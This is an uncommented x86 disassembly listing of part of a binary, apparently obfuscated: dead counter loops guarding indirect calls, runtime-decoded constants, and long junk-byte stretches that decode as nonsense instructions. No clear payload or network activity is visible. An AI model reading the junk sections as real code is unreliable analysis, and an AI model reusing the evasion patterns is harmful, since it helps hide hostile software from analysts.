  405cf3:	adc    DWORD PTR ds:0x4248d6,edi
  405cf9:	push   edi
  405cfa:	mov    DWORD PTR ds:0x44b6d4,0x13
  405d04:	cmp    DWORD PTR ds:0x44b6d4,0x0
  405d0b:	je     0x405e95
  405d11:	cmp    DWORD PTR ds:0x44b6d4,0x3
  405d18:	jne    0x405d31
  405d1e:	push   0x141c
  405d23:	push   0x6005
  405d28:	push   DWORD PTR [ebp-0xc]
  405d2b:	call   DWORD PTR ds:0x4430e0
  405d31:	cmp    DWORD PTR ds:0x44b6d4,0x4
  405d38:	jne    0x405d4d
  405d3e:	xor    edi,edi
  405d40:	xor    edi,DWORD PTR ds:0x44b6d4
  405d46:	dec    edi
  405d47:	mov    DWORD PTR ds:0x44b6d4,edi
  405d4d:	mov    edi,DWORD PTR ds:0x44b6d4
  405d53:	dec    edi
  405d54:	mov    DWORD PTR ds:0x44b6d4,edi
  405d5a:	jmp    0x405d04
  405d5f:	and    DWORD PTR ds:0x448988,0x5029
  405d69:	jmp    0x405e95
  405d6e:	out    0xd6,eax
  405d70:	(bad)  
  405d71:	sub    al,0xf9
  405d73:	sub    al,0xf9
  405d75:	jmp    0x592bcf2a
  405d7a:	sub    al,0x87
  405d7c:	adc    edx,DWORD PTR [edi+0x7c7c2191]
  405d82:	or     eax,0xfc7c7c7f
  405d87:	pop    edi
  405d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d89:	ret    
  405d8a:	aad    0x47
  405d8c:	test   eax,0xc46e3023
  405d91:	mov    edi,0x834177ba
  405d96:	adc    edx,0x48
  405d99:	rcl    edi,cl
  405d9b:	adc    ebx,DWORD PTR [ebx-0x24095719]
  405da1:	push   cs
  405da2:	cmp    eax,0x4367cb37
  405da7:	(bad)  
  405da8:	ret    
  405da9:	pushf  
  405daa:	(bad)  
  405dac:	sub    bl,BYTE PTR [edi+0x52]
  405daf:	test   BYTE PTR [esi-0x556fdd7e],0x76
  405db6:	xchg   edx,eax
  405db7:	adc    al,0x17
  405dba:	pop    es
  405dbb:	ror    DWORD PTR [ebp+0x1fb86fb7],cl
  405dc1:	cwde   
  405dc2:	int    0xca
  405dc4:	push   es
  405dc5:	or     eax,0xd8c64c64
  405dca:	lea    eax,[ecx+0x63f2a523]
  405dd0:	push   cs
  405dd1:	dec    esp
  405dd2:	jmp    0x628f:0xc2ac0793
  405dd9:	sub    eax,0xb0d0ddbd
  405dde:	dec    esp
  405ddf:	retf   0x39da
  405de2:	aam    0x32
  405de4:	xchg   ebp,eax
  405de5:	fisub  WORD PTR [ebx-0x63]
  405de8:	out    dx,al
  405de9:	ror    BYTE PTR [ecx+0x43],1
  405dec:	add    BYTE PTR [edx],cl
  405dee:	sub    eax,0xbfa6d922
  405df3:	mov    dh,0xa3
  405df5:	fcom   DWORD PTR [eax-0x65068cc]
  405dfb:	xchg   DWORD PTR [edx],edi
  405dfd:	or     eax,0x3ffb0e3a
  405e02:	stc    
  405e03:	mov    al,0x31
  405e05:	cwde   
  405e06:	ins    DWORD PTR es:[edi],dx
  405e07:	ss jp  0x405e89
  405e0a:	or     DWORD PTR [esi],ebx
  405e0c:	mov    ds:0xedd7b25f,al
  405e11:	cmp    BYTE PTR [edi-0x70da3a3d],bh
  405e17:	dec    ebx
  405e18:	push   eax
  405e19:	inc    ecx
  405e1a:	push   esp
  405e1b:	imul   ebx,DWORD PTR [esi],0x53f785a3
  405e21:	push   ebx
  405e22:	xchg   esi,eax
  405e23:	and    eax,0xf6ab659a
  405e28:	inc    esi
  405e29:	mov    BYTE PTR [edx+ecx*8-0x24],0xa1
  405e2e:	dec    ebp
  405e2f:	push   edx
  405e30:	add    al,0xc9
  405e32:	cmc    
  405e33:	lds    edx,FWORD PTR [edi-0x77d478f8]
  405e39:	(bad)  
  405e3a:	mov    WORD PTR [eax-0x258135fd],cs
  405e40:	dec    ebx
  405e41:	sub    eax,0x6ca88c57
  405e46:	fcom   DWORD PTR [esi-0x2256510f]
  405e4c:	pop    ebp
  405e4d:	mov    dh,0x15
  405e4f:	mov    ds,esp
  405e51:	adc    eax,0x66a4dbcf
  405e56:	adc    al,0x33
  405e58:	fdivp  st(7),st
  405e5a:	jnp    0x405e9f
  405e5c:	cmp    sp,WORD PTR [esi]
  405e5f:	lds    ecx,FWORD PTR [ebx-0x1cde6967]
  405e65:	mov    cl,0x9b
  405e67:	mov    eax,0xd819a018
  405e6c:	mov    bl,0x8c
  405e6e:	mov    ebx,DWORD PTR [edx-0x33e541a5]
  405e74:	dec    esi
  405e75:	in     al,0x96
  405e77:	lahf   
  405e78:	sub    DWORD PTR ss:[ebx+0x809e13],0xffffffe4
  405e80:	mov    ah,0x85
  405e82:	in     al,dx
  405e83:	mov    edi,0xd2f97aa4
  405e88:	call   0x5fca:0x432593b
  405e8f:	inc    edi
  405e90:	not    BYTE PTR [edx+0x39]
  405e93:	out    0x4b,eax
  405e95:	mov    esi,0x7510857
  405e9a:	xor    eax,esi
  405e9c:	movzx  edi,WORD PTR ds:0x410753
  405ea3:	xor    DWORD PTR ds:0x448980,edi
  405ea9:	mov    edi,0x32729e
  405eae:	jmp    0x405fda
  405eb3:	icebp  
  405eb4:	popa   
  405eb5:	jno    0x405f2b
  405eb7:	loope  0x405f1d
  405eb9:	mov    DWORD PTR [ecx-0x35],edi
  405ebc:	add    esi,DWORD PTR [esi+0x2d]
  405ebf:	ins    DWORD PTR es:[edi],dx
  405ec0:	dec    edx
  405ec1:	mov    esi,0x7c20aed7
  405ec6:	jl     0x405ed5
  405ec8:	jg     0x405f46
  405eca:	jl     0x405eb7
  405ecc:	loop   0x405f1c
  405ece:	push   cs
  405ecf:	into   
  405ed0:	cld    
  405ed1:	pop    es
  405ed2:	ret    
  405ed3:	out    dx,eax
  405ed4:	mov    eax,0xbd04dd31
  405ed9:	mov    cl,0x83
  405edb:	pop    edi
  405edc:	jge    0x405ef4
  405ede:	pop    es
  405edf:	push   ebx
  405ee0:	sub    BYTE PTR [edi+0x1f42d43a],dl
  405ee6:	stos   DWORD PTR es:[edi],eax
  405ee7:	pop    es
  405ee8:	xor    edx,DWORD PTR [ebx+ecx*4-0x43]
  405eec:	rol    BYTE PTR [edx+ebp*4+0x17],cl
  405ef0:	mov    bh,0x63
  405ef2:	xor    BYTE PTR [edx+0x15da6765],dh
  405ef8:	leave  
  405ef9:	call   0x348c4bb8
  405efe:	shr    BYTE PTR [esi-0x5e3d0bd],cl
  405f04:	call   0x55a4:0xf0609e55
  405f0b:	div    DWORD PTR [eax-0x80]
  405f0e:	scas   al,BYTE PTR es:[edi]
  405f0f:	aad    0x76
  405f11:	add    DWORD PTR [ebp+0x79c4d786],0x9caf5fdd
  405f1b:	dec    ebp
  405f1c:	jo     0x405ee6
  405f1e:	push   0xdd3e3ce2
  405f23:	inc    ebx
  405f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f25:	rcr    BYTE PTR [ebp+0x6c],1
  405f28:	sbb    ah,BYTE PTR [edi]
  405f2a:	call   0x640f6671
  405f2f:	inc    ebx
  405f30:	dec    edx
  405f31:	add    al,0xb5
  405f33:	sahf   
  405f34:	or     BYTE PTR [edi+eax*8-0x148c188b],ah
  405f3b:	imul   ecx,DWORD PTR [esi+edx*1+0x3f8c6dad],0x206bd9cd
  405f46:	adc    cl,BYTE PTR [eax+0x44d426d]
  405f4c:	bound  ecx,QWORD PTR [ebx]
  405f4e:	rcr    DWORD PTR [edx],1
  405f50:	add    BYTE PTR [ecx],ah
  405f52:	jl     0x405f89
  405f54:	mov    dh,0x69
  405f56:	pushf  
  405f57:	mov    ds:0x920e4a16,al
  405f5c:	iret   
  405f5d:	add    ebx,ebx
  405f5f:	xor    eax,0xa9441d1
  405f64:	arpl   WORD PTR [eax],bx
  405f66:	out    dx,eax
  405f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f68:	mov    ch,0x89
  405f6a:	test   BYTE PTR cs:[ecx+ebx*2-0x2d],bh
  405f6f:	lea    edi,[ebx]
  405f71:	mov    bl,0xb2
  405f73:	pusha  
  405f74:	repnz dec ebp
  405f76:	inc    esi
  405f77:	jge    0x405f22
  405f79:	sahf   
  405f7a:	js     0x405f71
  405f7c:	(bad)  
  405f7d:	fcom   QWORD PTR [eax+ebp*1]
  405f80:	aad    0x70
  405f82:	mov    esi,0xbe00dd3e
  405f87:	jp     0x405fa6
  405f89:	add    eax,ebp
  405f8b:	aad    0xf7
  405f8d:	sub    dl,BYTE PTR [ebp+0x7ee1114b]
  405f93:	cwde   
  405f94:	pop    ecx
  405f95:	xor    BYTE PTR [ebp-0x23c0659d],bl
  405f9b:	test   DWORD PTR [ebx+0x5c],edx
  405f9e:	ret    0xec43
  405fa1:	stos   DWORD PTR es:[edi],eax
  405fa2:	imul   eax,edi,0x50228279
  405fa8:	inc    eax
  405fa9:	(bad)  [eax]
  405fab:	or     ebp,DWORD PTR [edi+0x20]
  405fae:	repz inc esi
  405fb0:	mov    WORD PTR [ecx],es
  405fb2:	sub    ecx,ebx
  405fb4:	inc    eax
  405fb5:	in     al,dx
  405fb6:	(bad)  
  405fb7:	loope  0x405fc3
  405fb9:	(bad)  
  405fba:	or     eax,0x3865f9c
  405fbf:	aaa    
  405fc0:	hlt    
  405fc1:	add    al,0xa7
  405fc3:	aas    
  405fc4:	or     esp,DWORD PTR [eax]
  405fc6:	inc    eax
  405fc7:	jecxz  0x405fea
  405fc9:	cld    
  405fca:	cmp    al,0xb2
  405fcc:	add    eax,0xc5c57dbd
  405fd1:	add    DWORD PTR [edi-0x6d5404d6],ecx
  405fd7:	cmp    al,0x54
  405fd9:	mov    al,0x3
  405fdb:	(bad)  
  405fdc:	mov    DWORD PTR [ebp-0x20],eax
  405fdf:	mov    DWORD PTR ds:0x4248d2,0x15
  405fe9:	cmp    DWORD PTR ds:0x4248d2,0x0
  405ff0:	je     0x406021
  405ff6:	cmp    DWORD PTR ds:0x4248d2,0x23
  405ffd:	jne    0x40600e
  406003:	push   0x410927
  406008:	call   DWORD PTR ds:0x4430e4
  40600e:	xor    eax,eax
  406010:	or     eax,DWORD PTR ds:0x4248d2
  406016:	dec    eax
  406017:	mov    ds:0x4248d2,eax
  40601c:	jmp    0x405fe9
  406021:	mov    DWORD PTR [ebp-0x28],0xf89cb535
  406028:	mov    DWORD PTR [ebp-0x34],0xf89f0535
  40602f:	mov    DWORD PTR ds:0x448994,0x1696
  406039:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  406040:	or     DWORD PTR ds:0x44b6e0,edx
  406046:	mov    DWORD PTR [ebp-0x24],0xf89c85d5
  40604d:	and    DWORD PTR ds:0x410743,0x0
  406057:	jmp    0x40606a
  40605c:	xor    eax,eax
  40605e:	xor    eax,DWORD PTR ds:0x410743
  406064:	inc    eax
  406065:	mov    ds:0x410743,eax
  40606a:	cmp    DWORD PTR ds:0x410743,0x1c
  406071:	jae    0x4060ad
  406077:	cmp    DWORD PTR ds:0x410743,0x2b
  40607e:	jne    0x4060a3
  406084:	push   0x78a8
  406089:	push   0x44b6e0
  40608e:	push   0x8180
  406093:	push   0x6239
  406098:	push   0x1782
  40609d:	call   DWORD PTR ds:0x443364
  4060a3:	jmp    0x40605c
  4060a8:	xor    eax,0x3639
  4060ad:	mov    eax,DWORD PTR [ebp-0xc]
  4060b0:	add    DWORD PTR ds:0x4489a4,0x2d0a
  4060ba:	xor    eax,esi
  4060bc:	sbb    DWORD PTR ds:0x4248c2,0x6315
  4060c6:	add    eax,edi
  4060c8:	mov    DWORD PTR [ebp-0x18],eax
  4060cb:	or     DWORD PTR ds:0x44e414,0x658e
  4060d5:	mov    DWORD PTR [ebp-0x1c],0xf89c8530
  4060dc:	mov    BYTE PTR [ebp-0x1],0x57
  4060e0:	or     DWORD PTR ds:0x448994,edi
  4060e6:	mov    eax,DWORD PTR [ebp-0xc]
  4060e9:	xor    eax,esi
  4060eb:	add    eax,edi
  4060ed:	sbb    DWORD PTR ds:0x410753,0x34b4
  4060f7:	mov    DWORD PTR [ebp-0x18],eax
  4060fa:	dec    DWORD PTR ds:0x448998
  406100:	mov    eax,DWORD PTR [ebp-0x24]
  406103:	xor    eax,esi
  406105:	adc    DWORD PTR ds:0x41074b,0x44898c
  40610f:	add    eax,edi
  406111:	xor    DWORD PTR ds:0x448994,0x44e420
  40611b:	push   eax
  40611c:	mov    eax,DWORD PTR [ebp-0x28]
  40611f:	xor    eax,esi
  406121:	sbb    DWORD PTR ds:0x44899c,0x1e41
  40612b:	add    eax,edi
  40612d:	xor    DWORD PTR ds:0x448994,0x44e424
  406137:	push   eax
  406138:	and    DWORD PTR ds:0x41073f,0x0
  406142:	mov    eax,ds:0x41073f
  406147:	inc    eax
  406148:	mov    ds:0x41073f,eax
  40614d:	cmp    DWORD PTR ds:0x41073f,0xc
  406154:	jne    0x406170
  40615a:	push   0x8a0b
  40615f:	push   0x44b6d0
  406164:	push   DWORD PTR [ebp-0x28]
  406167:	push   DWORD PTR [ebp-0x20]
  40616a:	call   DWORD PTR ds:0x4430e8
  406170:	cmp    DWORD PTR ds:0x41073f,0xb
  406177:	jne    0x40618b
  40617d:	xor    eax,eax
  40617f:	add    eax,DWORD PTR ds:0x41073f
  406185:	inc    eax
  406186:	mov    ds:0x41073f,eax
  40618b:	cmp    DWORD PTR ds:0x41073f,0x17
  406192:	jb     0x406142
  406198:	movzx  eax,BYTE PTR ds:0x4248ca
  40619f:	xor    DWORD PTR ds:0x44b6d8,eax
  4061a5:	mov    eax,DWORD PTR [ebp-0x1c]
  4061a8:	neg    DWORD PTR ds:0x4248d2
  4061ae:	xor    eax,esi
  4061b0:	add    eax,edi
  4061b2:	or     DWORD PTR ds:0x44b6d8,0x41073f
  4061bc:	jmp    0x4062e8
  4061c1:	sar    DWORD PTR [ebp+0x7d793df9],cl
  4061c7:	sar    DWORD PTR [ebp+0x7a],cl
  4061ca:	sub    eax,0x6aa6f1da
  4061cf:	cmp    eax,0x7c23bf07
  4061d4:	jl     0x4061e3
  4061d6:	jg     0x406254
  4061d8:	jl     0x4061c0
  4061da:	pop    ds
  4061db:	sbb    al,0x1
  4061dd:	inc    esp
  4061de:	ss loope 0x406184
  4061e1:	popa   
  4061e2:	sub    al,0x68
  4061e4:	test   BYTE PTR [ecx+ebx*8+0x76ae1d90],dl
  4061eb:	xor    al,0xc0
  4061ed:	xor    BYTE PTR [edx+0x4ad1c97c],bl
  4061f3:	cmp    eax,0x19907138
  4061f8:	aam    0x1
  4061fa:	call   0x69c89e1a
  4061ff:	push   0x48f45e31
  406204:	or     DWORD PTR [edx+0x1e],ebp
  406207:	sbb    esi,esp
  406209:	loopne 0x406218
  40620b:	xchg   edi,eax
  40620c:	dec    edx
  40620d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40620e:	xchg   esi,eax
  40620f:	pusha  
  406210:	xchg   ebx,eax
  406211:	repz enter 0xa61e,0xfd
  406216:	add    al,0x78
  406218:	clc    
  406219:	ss (bad) 
  40621b:	aad    0x68
  40621d:	aaa    
  40621e:	in     eax,0x5c
  406220:	dec    BYTE PTR [esp+edi*4-0x14b1f34e]
  406227:	jmp    0x12b3:0x7f3cc311
  40622e:	call   0x68f6fa5a
  406233:	jo     0x4061c0
  406235:	adc    DWORD PTR [eax-0x4],eax
  406238:	inc    ebp
  406239:	lahf   
  40623a:	hlt    
  40623b:	jo     0x4061c0
  40623d:	test   al,0xeb
  40623f:	or     dh,dl
  406241:	jbe    0x4061f3
  406243:	daa    
  406244:	rcl    BYTE PTR es:[ecx-0xb],0xe4
  406249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40624a:	add    DWORD PTR [eax-0x42193228],ecx
  406250:	popf   
  406251:	sub    al,0x23
  406253:	lahf   
  406254:	gs jl  0x406276
  406257:	jmp    0x914d9f71
  40625c:	pop    ebp
  40625d:	in     al,dx
  40625e:	dec    eax
  40625f:	aaa    
  406260:	xchg   ebx,eax
  406261:	sub    bl,BYTE PTR [esi-0x2d]
  406264:	cmp    eax,0xcc311905
  406269:	jnp    0x4062d7
  40626b:	cmp    esi,eax
  40626d:	and    al,0x99
  40626f:	mov    esi,0xef1e1996
  406274:	les    esp,FWORD PTR [ebx+edx*2]
  406277:	dec    edx
  406278:	cld    
  406279:	mov    dh,al
  40627b:	outs   dx,DWORD PTR ds:[esi]
  40627c:	fs dec ebx
  40627e:	xchg   DWORD PTR [ebp+eax*2+0x25],ecx
  406282:	jmp    0xd1ff1dff
  406287:	fucom  st(3)
  406289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40628a:	lock fldenv [ebp+0x60]
  40628e:	push   ss
  40628f:	je     0x4062d4
  406291:	sub    esp,DWORD PTR [edx]
  406293:	jp     0x406276
  406295:	jae    0x40629e
  406297:	xor    esp,esp
  406299:	dec    edx
  40629a:	lea    edx,[esi-0x702ec4e]
  4062a0:	and    eax,0xe56fd4b1
  4062a5:	stos   DWORD PTR es:[edi],eax
  4062a6:	jecxz  0x40626d
  4062a8:	pop    esp
  4062a9:	jnp    0x4062e7
  4062ab:	repz jnp 0x40627a
  4062ae:	imul   esp,DWORD PTR [esi],0xffffff9a
  4062b1:	lock adc DWORD PTR [ecx-0x708b877c],esp
  4062b8:	xchg   esp,eax
  4062b9:	pop    ebx
  4062ba:	in     eax,dx
  4062bb:	mov    al,0x43
  4062bd:	scas   eax,DWORD PTR es:[edi]
  4062be:	push   cs
  4062bf:	daa    
  4062c0:	ins    DWORD PTR es:[edi],dx
  4062c1:	push   ds
  4062c2:	fwait
  4062c3:	loop   0x406246
  4062c5:	cmp    eax,0x23e61e1c
  4062ca:	dec    ebx
  4062cb:	pop    edi
  4062cc:	scas   eax,DWORD PTR es:[edi]
  4062cd:	loop   0x406294
  4062cf:	mov    al,0x3e
  4062d1:	daa    
  4062d2:	adc    bh,bl
  4062d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062d5:	mov    al,ds:0x908cef96
  4062da:	ins    DWORD PTR es:[edi],dx
  4062db:	push   esp
  4062dc:	xchg   ecx,eax
  4062dd:	aas    
  4062de:	mov    bh,al
  4062e0:	push   edi
  4062e1:	xor    ecx,DWORD PTR [ebx]
  4062e3:	jg     0x40631d
  4062e5:	nop
  4062e6:	add    BYTE PTR [edx],0x50
  4062e9:	lea    eax,[ebp-0x78]
  4062ec:	add    DWORD PTR ds:0x44e410,0x44e418
  4062f6:	push   eax
  4062f7:	or     DWORD PTR ds:0x4489a4,0x4248ce
  406301:	push   DWORD PTR [ebp-0xc]
  406304:	add    DWORD PTR ds:0x44b6cc,0x4248d6
  40630e:	jmp    0x40643a
  406313:	push   edx
  406314:	repz fist WORD PTR [ebp-0x4cadaa2f]
  40631b:	adc    DWORD PTR [esi+0x461830af],esp
  406321:	aas    
  406322:	cmp    DWORD PTR [edx+eiz*1+0x7c],ecx
  406326:	jl     0x406335
  406328:	jg     0x4063a6
  40632a:	jl     0x406350
  40632c:	pop    esp
  40632d:	xchg   edx,eax
  40632e:	xor    DWORD PTR [ecx+0x2b58f8b0],ecx
  406334:	ss (bad) 
  406337:	inc    eax
  406338:	adc    DWORD PTR [ebp+0x1],edx
  40633b:	xor    cl,bh
  40633d:	stos   BYTE PTR es:[edi],al
  40633e:	and    eax,0x79f30c76
  406343:	push   es
  406344:	xor    BYTE PTR ds:0x8caf6ecf,dh
  40634a:	mov    BYTE PTR [esi],cl
  40634c:	or     eax,0xb930f19f
  406351:	mov    ds:0xaf858df9,eax
  406356:	sub    al,0x73
  406358:	xchg   esi,eax
  406359:	and    DWORD PTR [esi],eax
  40635b:	cmp    eax,0x9bc473bd
  406360:	repz add eax,0x29342813
  406366:	sub    ch,BYTE PTR [ecx]
  406368:	out    dx,al
  406369:	dec    esp
  40636a:	jbe    0x40633d
  40636c:	jmp    FWORD PTR [esi+edi*2]
  40636f:	retf   0x9121
  406372:	jp     0x406386
  406374:	cmp    eax,0xf608f9ba
  406379:	cli    
  40637a:	inc    ebx
  40637b:	mov    ah,0x27
  40637d:	adc    BYTE PTR [esi],ah
  40637f:	retf   
  406380:	push   es
  406381:	frstor [edi+0x28fd9be9]
  406387:	stos   BYTE PTR es:[edi],al
  406388:	(bad)  [eax]
  40638a:	call   0x7f40:0xdee0c9d5
  406391:	inc    esp
  406392:	push   0xea8cae14
  406397:	imul   edi,DWORD PTR ds:[eax+0x52],0x43
  40639c:	push   0xffffff8f
  40639e:	out    0x6e,al
  4063a0:	dec    ebp
  4063a1:	outs   dx,BYTE PTR ds:[esi]
  4063a2:	sub    dl,BYTE PTR [ebx-0x29]
  4063a5:	sbb    al,0x83
  4063a7:	xor    al,0xca
  4063a9:	jmp    0x4063d6
  4063ab:	push   ebx
  4063ac:	jbe    0x40635c
  4063ae:	popf   
  4063af:	adc    esi,eax
  4063b1:	adc    eax,0x5e4d1474
  4063b6:	and    BYTE PTR [ecx],bh
  4063b8:	jl     0x4063e1
  4063ba:	or     ecx,eax
  4063bc:	sar    BYTE PTR [esp+eax*4],cl
  4063bf:	sti    
  4063c0:	jae    0x406433
  4063c2:	fidivr DWORD PTR [eax-0xf]
  4063c5:	pop    eax
  4063c6:	push   esi
  4063c7:	stos   BYTE PTR es:[edi],al
  4063c8:	cmp    eax,DWORD PTR [ebp-0x33ad6564]
  4063ce:	loopne 0x40641e
  4063d0:	fldenv [edx]
  4063d2:	mov    dl,0xf5
  4063d4:	mov    ah,0x5a
  4063d6:	dec    ecx
  4063d7:	das    
  4063d8:	repnz jmp 0x7f8b:0x36cad0f9
  4063e0:	dec    ebp
  4063e1:	sbb    ch,al
  4063e3:	cmp    BYTE PTR [ebp+0x42],al
  4063e6:	ret    0x29fb
  4063e9:	data16 sub BYTE PTR [edi-0x22],dl
  4063ed:	and    eax,0x3b39a796
  4063f2:	mov    ebx,0xf588cf06
  4063f7:	ret    
  4063f8:	mov    esi,0xa50be790
  4063fd:	cmp    eax,DWORD PTR [ebx]
  4063ff:	fist   WORD PTR [ebp+0x1a]
  406402:	es sahf 
  406404:	and    eax,0xb4d055de
  406409:	cmc    
  40640a:	(bad)  
  40640b:	xor    DWORD PTR [ecx-0x4bd55434],ebx
  406411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406412:	not    BYTE PTR [ebx+0xa361530]
  406418:	fcomp  DWORD PTR [ecx]
  40641a:	test   al,0x8b
  40641c:	sub    BYTE PTR [esi],ch
  40641e:	fxch   st(1)
  406420:	lods   eax,DWORD PTR ds:[esi]
  406421:	add    ebx,DWORD PTR [edx+0x24780875]
  406427:	xchg   ebp,eax
  406428:	mov    edx,0xb1de90a9
  40642d:	cli    
  40642e:	sbb    DWORD PTR [ebx],0xdc4c872b
  406434:	sub    dh,0xa1
  406437:	push   0x75ff527c
  40643c:	in     al,dx
  40643d:	jmp    0x406569
  406442:	xchg   BYTE PTR [edi-0x29ad99e],ah
  406448:	pop    edx
  406449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40644a:	inc    eax
  40644b:	adc    al,0x79
  40644d:	sub    al,0xab
  40644f:	loope  0x406480
  406451:	ret    0x255d
  406454:	jl     0x4064d2
  406456:	or     eax,0x9f7c7c7f
  40645b:	lods   al,BYTE PTR ds:[esi]
  40645c:	test   eax,0x86bcff4d
  406461:	lods   al,BYTE PTR ds:[esi]
  406462:	dec    ebx
  406463:	daa    
  406464:	xor    BYTE PTR [esi+0x6c],al
  406467:	fucomi st,st(2)
  406469:	call   0xb033:0x624f8497
  406470:	sbb    DWORD PTR [edi+ebp*4],esp
  406473:	lds    eax,FWORD PTR [edx-0x4c]
  406476:	push   cs
  406477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406478:	retf   
  406479:	xor    al,0x9e
  40647b:	or     esp,DWORD PTR [ebx]
  40647d:	gs int 0xb4
  406480:	pushf  
  406481:	mov    ?,WORD PTR [ebp-0x43]
  406484:	xor    DWORD PTR [edi],0x79
  406487:	ror    DWORD PTR [edx-0xc297055],1
  40648d:	mov    eax,0x6f960ba6
  406492:	xor    al,0xfc
  406494:	mov    DWORD PTR ds:0xdebd16f3,ebp
  40649a:	outs   dx,DWORD PTR ds:[esi]
  40649b:	push   ebx
  40649c:	mov    eax,0x856aaa5a
  4064a1:	adc    bh,bh
  4064a3:	push   ecx
  4064a4:	in     eax,0xe5
  4064a6:	xor    bl,BYTE PTR [ecx-0x7801f53e]
  4064ac:	popa   
  4064ad:	fnstenv [ebp-0x8]
  4064b0:	and    eax,DWORD PTR [ecx+0x5d]
  4064b3:	jne    0x406478
  4064b5:	ficom  DWORD PTR [eax]
  4064b7:	out    dx,eax
  4064b8:	(bad)  
  4064b9:	mov    ebx,0xc822e7ac
  4064be:	mov    ds:0x437739b3,al
  4064c3:	xor    al,0x89
  4064c5:	das    
  4064c6:	out    0xd7,al
  4064c8:	or     esp,DWORD PTR [esi+edx*8+0x0]
  4064cc:	in     al,dx
  4064cd:	adc    al,0xfd
  4064cf:	sub    ebx,edx
  4064d1:	jp     0x4064f5
  4064d3:	outs   dx,DWORD PTR es:[esi]
  4064d5:	and    al,BYTE PTR [ecx+0x1edeb835]
  4064db:	mov    dl,0x7a
  4064dd:	sub    al,0x2
  4064df:	(bad)  
  4064e0:	fnsave [esi]
  4064e2:	xchg   ecx,eax
  4064e3:	adc    al,0xe5
  4064e5:	mov    ds:0x6f4e7fde,eax
  4064ea:	loope  0x406520
  4064ec:	xchg   ecx,eax
  4064ed:	fld    TBYTE PTR [esi]
  4064ef:	dec    edx
  4064f0:	mov    bl,0x53
  4064f2:	mov    cl,0x5d
  4064f4:	push   ebx
  4064f5:	ins    BYTE PTR es:[edi],dx
  4064f6:	mov    BYTE PTR [edi+0x67],dh
  4064f9:	jp     0x406550
  4064fb:	jnp    0x40656e
  4064fd:	lds    edx,FWORD PTR [ebx+0x193239d1]
  406503:	xchg   DWORD PTR [ecx-0xb5e3333],edi
  406509:	ret    
  40650a:	dec    ebx
  40650b:	push   edi
  40650c:	pop    eax
  40650d:	adc    bh,BYTE PTR [ebx]
  40650f:	out    dx,al
  406510:	pop    edx
  406511:	shl    bl,cl
  406513:	loope  0x406546
  406515:	fdivr  DWORD PTR [edx]
  406517:	cmp    DWORD PTR [ebx-0x5b],edx
  40651a:	mov    ecx,0x719a9eae
  40651f:	test   BYTE PTR [ebp-0x4187fc78],bh
  406525:	xor    eax,0x9b042a4c
  40652a:	jb     0x406583
  40652c:	jb     0x40657f
  40652e:	std    
  40652f:	into   
  406530:	pop    edi
  406531:	jle    0x406504
  406533:	call   0x87a67a7b
  406538:	add    eax,0xe86b775e
  40653d:	repz mov ss,WORD PTR [ebp-0x1e2aa2b1]
  406544:	mul    DWORD PTR [edx+esi*4]
  406547:	adc    al,0x2c
  406549:	fs or  eax,ebp
  40654c:	loope  0x40655d
  40654e:	xchg   ebp,eax
  40654f:	sub    dl,BYTE PTR [esi]
  406551:	mov    WORD PTR [ebx-0x5522e987],gs
  406557:	pusha  
  406558:	push   ds
  406559:	add    al,0xe9
  40655b:	mov    dl,0xc
  40655d:	enter  0xf5d2,0x4d
  406561:	(bad)
  406565:	push   ecx
  406566:	scas   eax,DWORD PTR es:[edi]
  406567:	cli    
  406568:	stos   BYTE PTR es:[edi],al
  406569:	call   0x405120
  40656e:	test   eax,eax
  406570:	je     0x40692c
  406576:	sbb    DWORD PTR ds:0x41075b,0x44899c
  406580:	lea    eax,[ebp-0x78]
  406583:	push   eax
  406584:	mov    eax,DWORD PTR [ebp-0x14]
  406587:	xor    eax,esi
  406589:	add    eax,edi
  40658b:	push   eax
  40658c:	mov    eax,DWORD PTR [ebp-0x10]
  40658f:	jmp    0x4066bb
  406594:	dec    edx
  406595:	add    bh,BYTE PTR [ebx]
  406597:	cmp    DWORD PTR [ebx-0x43],0x6a
  40659b:	fnsave [eax]
  40659d:	xchg   ebx,eax
  40659e:	mov    al,0xc5
  4065a0:	add    ebx,DWORD PTR [esi]
  4065a2:	fadd   QWORD PTR [esi+0x7c7c246a]
  4065a8:	or     eax,0x1a7c7c7f
  4065ad:	jns    0x406561
  4065af:	fwait
  4065b0:	sar    DWORD PTR [di+0x2f],0xa4
  4065b5:	jp     0x406578
  4065b7:	cwde   
  4065b8:	pop    esp
  4065b9:	pusha  
  4065ba:	jnp    0x406613
  4065bc:	rcr    DWORD PTR [eax-0x15b0ecf4],cl
  4065c2:	inc    ecx
  4065c3:	push   edx
  4065c4:	pop    es
  4065c5:	ret    0x332e
  4065c8:	jle    0x406592
  4065ca:	inc    esi
  4065cb:	std    
  4065cc:	or     al,0xf2
  4065ce:	adc    al,0x72
  4065d0:	xchg   ebp,eax
  4065d1:	add    eax,0xacc56afe
  4065d6:	push   DWORD PTR [ecx-0x32]
  4065d9:	lods   al,BYTE PTR ds:[esi]
  4065da:	int    0x92
  4065dc:	scas   eax,DWORD PTR es:[edi]
  4065dd:	pop    ebx
  4065de:	push   0xf1c07336
  4065e3:	lahf   
  4065e4:	daa    
  4065e5:	mov    al,ds:0x29cea60c
  4065ea:	pop    es
  4065eb:	add    ah,bh
  4065ed:	out    0x19,eax
  4065ef:	mov    ecx,0x2e5496c
  4065f4:	mov    dh,0xb5
  4065f6:	jne    0x406628
  4065f8:	in     al,dx
  4065f9:	outs   dx,DWORD PTR ds:[esi]
  4065fa:	je     0x40664f
  4065fc:	mov    eax,0xf2e450c5
  406601:	lods   eax,DWORD PTR ds:[esi]
  406602:	mov    ecx,0x8bf86ccb
  406607:	or     BYTE PTR [esi+0x2cffbf71],dh
  40660d:	and    BYTE PTR [edi+edi*8+0x6b5a4b3e],cl
  406614:	push   esp
  406615:	pusha  
  406616:	dec    esp
  406617:	sub    edx,DWORD PTR [eax+0x19]
